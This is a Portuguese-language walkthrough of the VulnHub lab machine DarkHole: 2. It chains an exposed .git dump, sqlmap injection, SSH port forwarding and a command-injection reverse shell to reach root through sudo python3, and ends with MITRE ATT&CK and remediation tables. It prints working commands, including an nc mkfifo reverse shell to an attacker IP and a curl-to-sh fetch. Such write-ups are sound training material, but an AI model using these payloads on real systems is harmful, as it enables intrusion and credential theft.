# DarkHole: 2 — Writeup (PT-BR)

> Uma box chamada DarkHole entrega exatamente o que promete: um buraco negro fundo e escuro que começa com um repositório git público e termina com `sudo python3`. ( ͡° ͜ʖ ͡°)
>
> Cada camada desta máquina exige uma técnica diferente. O histórico git revela credenciais, a injeção SQL pivota para um novo usuário, o port forwarding expõe um app interno oculto, um arquivo bash_history armazena descuidadamente outra senha em texto puro, e então uma única chamada de `sudo -l` fecha o loop. Nenhum desses passos é exótico. Todos são perturbadoramente comuns em ambientes reais. ¯\_(ツ)_/¯

---

| Campo | Valor |
|-------|-------|
| **Level** | Médio-Difícil |
| **VM Alvo** | DarkHole: 2 (Linux) |
| **VM Atacante** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/darkhole-2,740/ |
| **Técnicas** | Dump de diretório `.git` exposto, recuperação de credenciais do histórico git, SQL injection autenticado, acesso SSH, port forwarding local, injeção de comando em app PHP interno, extração de credenciais do bash history, escalação de privilégio via sudo python3 |
| **CVEs** | Nenhum CVE específico. Todos os vetores de ataque são configurações incorretas: `.git` exposto, SQLi em endpoint autenticado, injeção de comando em app interno, `sudo python3` NOPASSWD, credenciais no bash history. |
| **Grupos APT** | APT41 (exploração web combinada com pivot para serviços internos), Lazarus Group (encadeamento de credenciais entre serviços), FIN7 (exfiltração de código-fonte e credenciais via git) |

---

## Resumo do Ataque

```
[nmap] portas 22, 80
    |
    v
[web] diretório .git exposto
    |
    v
[git-dumper] baixar histórico completo do repositório
    |
    v
[git diff <commit>] credenciais removidas: lush@admin.com:321
    |
    v
[login web] sessão autenticada
    |
    v
[Burp Suite] interceptar cookie -> salvar em arquivo
    |
    v
[SQLMap] sqlmap -r sql --dbs -> darkhole_2 -> dump: jehad:fool
    |
    v
[ssh jehad@ALVO] acesso SSH
    |
    v
[LinPEAS] app interno em localhost:9999 rodando como losy
    |
    v
[ssh -L 9999:localhost:9999] port forward para o atacante
    |
    v
[http://127.0.0.1:9999/?cmd=id] injeção de comando confirmada
    |
    v
[nc -lvp 8888] reverse shell como losy
    |
    v
[cat .bash_history] senha: gang
    |
    v
[su losy; sudo -l] (root) NOPASSWD: /usr/bin/python3
    |
    v
[sudo python3 -c 'import pty; pty.spawn("/bin/bash")'] -> root
    |
    v
[cat /root/root.txt] PRONTO
```

---

## Metodologia

1. Descoberta de rede e scan de portas
2. Descoberta de diretório `.git` exposto e dump completo do repositório
3. Extração de credenciais via git diff (linhas removidas no histórico de commits)
4. Login na aplicação web com credenciais recuperadas
5. SQL injection via intercepção de cookie com Burp Suite para dump de credenciais adicionais
6. Acesso SSH como `jehad` e descoberta de serviço interno assistida por LinPEAS
7. Port forwarding SSH local para alcançar app PHP interno em localhost:9999
8. Injeção de comando no app interno para obter reverse shell como `losy`
9. Extração de credenciais do bash history
10. Escalação de privilégio via `sudo python3` (GTFOBins)

---

## Passo 1: Descoberta de Rede e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
export TARGET=192.168.1.179
nmap -A $TARGET
```

Saída esperada (resumida):

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

Duas portas. Padrão. Mas o servidor web tem algo incomum: um diretório `.git`.

> **TTP MITRE:** T1595.002 — Active Scanning: Vulnerability Scanning

---

## Passo 2: Dump do Repositório Git Exposto

A raiz web ou um subdiretório tem um diretório `.git` acessível via HTTP. Isso permite reconstruir o repositório completo incluindo todo o histórico de commits, incluindo commits onde credenciais foram adicionadas e depois removidas.

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
mkdir backup
python3 git_dumper.py http://$TARGET/.git/ backup
cd backup
```

Revise o histórico de commits:

```bash
git log
```

Identifique o commit mais antigo que provavelmente contém credenciais antes de serem removidas. Depois faça o diff:

```bash
git diff a4d900a8d85e8938d3601f3cef113ee293028e10
```

Na saída do diff, procure linhas começando com `-` (linhas removidas). Você vai encontrar:

```diff
-email: lush@admin.com
-password: 321
```

Credenciais extraídas: `lush@admin.com` / `321`. ( ͡° ͜ʖ ͡°)

> **TTP MITRE:** T1213 — Data from Information Repositories; T1552.001 — Credentials in Files

> **Relevância no mundo real:** Deletar credenciais do código-fonte e commitar a remoção NÃO as remove do histórico git. Todo o histórico é preservado, incluindo as linhas "deletadas". O FIN7 usou essa técnica para extrair credenciais de banco de dados, chaves de API e senhas admin de repositórios expostos. Mais de 4 milhões de segredos foram encontrados em repositórios públicos do GitHub usando técnicas similares.

> **Alternativa:** `truffleHog` ou `gitleaks` podem escanear o repositório automaticamente em busca de credenciais: `gitleaks detect --source ./backup`

---

## Passo 3: Login Web e SQL Injection via Burp Suite

Faça login na aplicação web em `http://$TARGET/` com as credenciais recuperadas:

- Email: `lush@admin.com`
- Senha: `321`

Uma vez logado, intercepte qualquer requisição autenticada com o Burp Suite. O cookie de sessão autentica a requisição. Salve a requisição HTTP completa (com cookie) em um arquivo chamado `sql`.

Execute o SQLMap contra o endpoint autenticado:

```bash
sqlmap -r sql --dbs --batch
```

Aguarde a enumeração dos bancos de dados. Então mire no banco da aplicação:

```bash
sqlmap -r sql -D darkhole_2 --dump-all --batch
```

Credenciais extraídas do banco `darkhole_2`:

| Usuário | Senha |
|---------|-------|
| `jehad` | `fool` |

> **TTP MITRE:** T1190 — Exploit Public-Facing Application; T1078.003 — Valid Accounts: Local Accounts

> **Relevância no mundo real:** SQL injection em endpoints autenticados é frequentemente negligenciado. Desenvolvedores frequentemente assumem que usuários autenticados são confiáveis. O APT41 demonstrou esse padrão contra aplicações web corporativas onde a camada de autenticação era sólida, mas a lógica interna era vulnerável à injeção após a autenticação.

> **Alternativa:** SQL injection manual via Burp Repeater com payloads como `' OR '1'='1` em parâmetros POST, ou usando `sqlmap --forms` para auto-detectar formulários.

---

## Passo 4: Acesso SSH como jehad

Use as credenciais extraídas do banco para fazer login via SSH:

```bash
ssh jehad@$TARGET
# senha: fool
id
# uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
```

Ponto de entrada inicial estabelecido. Agora descubra o que mais está rodando nessa box.

> **TTP MITRE:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

## Passo 5: Descoberta de Serviço Interno com LinPEAS

Baixe e execute o LinPEAS para enumerar o ambiente local:

```bash
curl -sL https://raw.githubusercontent.com/carlospalop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

O LinPEAS identifica um aplicativo PHP rodando em `localhost:9999` como o usuário `losy`. O serviço está vinculado apenas ao loopback, portanto não é diretamente alcançável pela máquina atacante.

> **TTP MITRE:** T1049 — System Network Connections Discovery; T1057 — Process Discovery

> **Alternativa:** Enumeração manual com `netstat -antp | grep LISTEN` ou `ss -tlnp` alcança o mesmo resultado sem baixar o LinPEAS.

---

## Passo 6: Port Forwarding SSH Local

Abra um segundo terminal e encaminhe a porta 9999 do localhost do alvo para sua máquina atacante:

```bash
ssh jehad@$TARGET -L 9999:localhost:9999
```

Agora acesse `http://127.0.0.1:9999/?cmd=id` na máquina atacante.

A resposta inclui a saída de `id`, confirmando execução remota de código como `losy`. ( ͡° ͜ʖ ͡°)

> **TTP MITRE:** T1572 — Protocol Tunneling; T1090 — Proxy

---

## Passo 7: Reverse Shell via Injeção de Comando

O parâmetro `cmd` no app PHP interno passa a entrada diretamente para o shell do sistema. Crie um payload de reverse shell.

Faça URL-encode do payload (Burp Decoder ou Python):

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.107 8888 >/tmp/f'))"
```

Inicie um listener:

```bash
nc -lvp 8888
```

Envie o payload via browser ou curl:

```bash
curl "http://127.0.0.1:9999/?cmd=rm+/tmp/f%3Bmkfifo+/tmp/f%3Bcat+/tmp/f%7C/bin/sh+-i+2%3E%261%7Cnc+192.168.1.107+8888+%3E/tmp/f"
```

Uma shell chega como `losy`. Faça upgrade para um TTY adequado:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **TTP MITRE:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1105 — Ingress Tool Transfer

---

## Passo 8: Extração de Credenciais do Bash History

Leia a flag de usuário e verifique o bash history:

```bash
cd /home/losy
cat user.txt
cat .bash_history
```

O bash history contém um comando `su` com a senha visível em texto puro:

```
su losy
gang
```

Senha para `losy`: `gang`. ¯\_(ツ)_/¯

> **TTP MITRE:** T1552.003 — Credentials in Files: Bash History

> **Relevância no mundo real:** Senhas digitadas diretamente no terminal ficam armazenadas no bash history. Esta é uma das formas mais comuns de credenciais serem acidentalmente expostas em ambientes Linux reais. Muitos atacantes verificam o `.bash_history` como uma etapa rotineira durante o pós-exploração.

---

## Passo 9: Escalação de Privilégio via sudo python3

Troque para `losy` com a senha recuperada e verifique as permissões sudo:

```bash
su losy
# senha: gang
sudo -l
```

Saída:

```
(root) NOPASSWD: /usr/bin/python3
```

`losy` pode rodar `python3` como root sem senha. Esse é um clássico GTFOBins:

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Shell root. ᕕ( ᐛ )ᕗ

Leia a flag root:

```bash
cat /root/root.txt
```

> **TTP MITRE:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

> **Relevância no mundo real:** `sudo python3` sem restrição está listado no GTFOBins e é ativamente buscado por frameworks de pós-exploração. Qualquer entrada sudo NOPASSWD para uma linguagem interpretada (Python, Perl, Ruby, Node.js) efetivamente concede acesso root irrestrito.

---

## Flags / Hashes / Credenciais Capturadas

| Item | Valor |
|------|-------|
| Credenciais do git diff | `lush@admin.com` / `321` |
| Credenciais do dump SQL | `jehad` / `fool` |
| Credenciais do bash history | `losy` / `gang` |
| Flag de usuário | `/home/losy/user.txt` |
| Flag root | `/root/root.txt` |

---

## Lições Aprendidas

1. **Deletar credenciais do git NÃO as remove do histórico.** O log completo de commits é preservado. Um diretório `.git` exposto em um servidor web é equivalente a publicar seu código-fonte e todos os seus segredos.

2. **SQL injection em endpoints autenticados** é tão perigoso quanto em formulários de login públicos. Nunca confie em usuários autenticados com entrada não sanitizada.

3. **Serviços internos no localhost não estão protegidos uma vez que o host é comprometido.** O port forwarding SSH faz uma ponte trivialmente entre o atacante e qualquer serviço vinculado ao loopback.

4. **`sudo python3 NOPASSWD` é acesso root irrestrito.** Qualquer linguagem de script com sudo NOPASSWD contorna todos os controles de acesso. O GTFOBins documenta dezenas desses padrões.

5. **O bash history armazena argumentos de comando em texto puro, incluindo senhas.** Usuários frequentemente digitam `su user` seguido da senha na próxima linha, ou embutem senhas em flags de comando. Scripts de pós-exploração verificam esse arquivo automaticamente.

**Relevância no Mundo Real:** Essa cadeia de ataque espelha intrusões documentadas do APT41 contra aplicações web corporativas: vazamento de repo git, cadeia de credenciais, pivot para serviço interno, escalação via sudo mal configurado. O fato de cada passo usar uma conta de usuário diferente também é realista: atacantes frequentemente pivotam por múltiplos usuários locais antes de chegar ao root, coletando credenciais ao longo do caminho.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Ferramenta |
|--------|---------|-----|------------|
| Reconhecimento | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Acesso a Credenciais | Data from Information Repositories | T1213 | git-dumper |
| Acesso a Credenciais | Credentials in Files | T1552.001 | git diff |
| Acesso a Credenciais | Bash History | T1552.003 | cat .bash_history |
| Acesso Inicial | Exploit Public-Facing Application | T1190 | SQLMap |
| Acesso Inicial | Valid Accounts: Local Accounts | T1078.003 | SSH |
| Descoberta | System Network Connections Discovery | T1049 | LinPEAS / netstat |
| Descoberta | Process Discovery | T1057 | LinPEAS / ps |
| Movimentação Lateral | Remote Services: SSH | T1021.004 | ssh -L port forward |
| Movimentação Lateral | Protocol Tunneling | T1572 | forward SSH local |
| Execução | Command and Scripting Interpreter: Unix Shell | T1059.004 | injeção cmd= |
| Escalação de Privilégio | Abuse Elevation Control Mechanism: Sudo | T1548.003 | sudo python3 |
| Comando e Controle | Ingress Tool Transfer | T1105 | curl / LinPEAS |

---

## Remediação

### NIST CSF 2.0

| Função | Controle | Ação |
|--------|----------|------|
| Identificar (ID.AM) | Inventário de ativos | Catalogar serviços internos incluindo processos vinculados ao loopback e seus proprietários |
| Proteger (PR.AC) | Controle de acesso | Remover `sudo python3 NOPASSWD`; revisar todas as entradas do sudoers |
| Proteger (PR.DS) | Segurança de dados | Bloquear acesso HTTP ao `.git`; adicionar hooks de pre-commit para escanear segredos |
| Detectar (DE.CM) | Monitoramento | Alertar sobre padrões SQLi no WAF; monitorar criação de bash history em contas sensíveis |
| Proteger (PR.IP) | Tecnologia de proteção | Sanitizar parâmetro `cmd` no app PHP interno; usar execução parametrizada |

### NIST SP 800-53 Rev. 5

| Controle | Descrição |
|---------|-----------|
| AC-6 | Menor Privilégio: remover sudo NOPASSWD para binários de interpretador |
| SI-10 | Validação de Entrada de Informação: sanitizar o parâmetro `cmd`; rejeitar metacaracteres de shell |
| SA-15 | Processo de Desenvolvimento: exigir escaneamento de segredos (gitleaks, truffleHog) no CI/CD antes do merge |
| SC-7 | Proteção de Fronteira: bloquear com firewall apps PHP internos mesmo no loopback; restringir quem pode fazer port forwarding |
| AU-3 | Conteúdo de Registros de Auditoria: registrar todas as invocações de `sudo` com comando e argumentos |
| IA-5 | Gerenciamento de Autenticador: aplicar `HISTCONTROL=ignorespace` e `HISTFILE=/dev/null` para contas de serviço |

### CISA KEV

Nenhum CVE desta box aparece no catálogo CISA KEV. Todos os vetores explorados são configurações incorretas. A orientação relevante mais próxima é o advisory da CISA sobre segurança de sistemas de controle de versão expostos na web.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domínio | Prática | Lacuna |
|---------|---------|--------|
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | Serviços PHP internos não inventariados; sem processo de revisão de configuração |
| Identity and Access Management (IAM) | MIL-2 | sudo NOPASSWD para binários de interpretador; sem revisão de acesso privilegiado |
| Threat and Vulnerability Management (THREAT) | MIL-1 | SQLi e injeção de comando não detectados; sem escaneamento de segredos no desenvolvimento |
| Situational Awareness (SA) | MIL-1 | Sem monitoramento de port forwarding, acesso a serviço interno ou invocações de sudo |

### MITRE D3FEND

| Técnica D3FEND | ID | Endereça |
|----------------|----|----------|
| Application Configuration Hardening | D3-ACH | Bloquear acesso HTTP ao `.git`; sanitizar parâmetro `cmd` |
| Credential Hardening | D3-CH | Remover credenciais do histórico git; usar variáveis de ambiente ou cofres |
| Software Update | D3-SU | Usar queries parametrizadas para eliminar SQL injection |
| Network Traffic Filtering | D3-NTF | Restringir port forwarding SSH para usuários não administradores (AllowTcpForwarding no) |
| Executable Allowlisting | D3-EAL | Restringir entradas sudo a comandos específicos e não-interpretadores |
| Process Spawn Analysis | D3-PSA | Alertar sobre `python3` executado com privilégios root fora dos processos esperados |

---

## Considerações Finais

DarkHole: 2 merece sua classificação de "Médio-Difícil". As técnicas individualmente não são difíceis, mas a cadeia é longa e cada passo exige um estado mental ligeiramente diferente. A máquina ensina a pensar lateralmente: não só "o que posso fazer aqui?" mas "para onde isso leva depois?"

O truque do histórico git é o destaque. Muitos desenvolvedores acreditam que deleção equivale a apagamento. Não equivale. Entender o histórico de commits do git como uma superfície de ataque é uma habilidade que se paga constantemente em trabalho real de bug bounty e red team.

Muito obrigado ao autor da série DarkHole por construir uma máquina que respeita a inteligência do jogador e ensina padrões de ataque do mundo real sem atalhos.

Thanks guys!! (❍ᴥ❍ʋ)
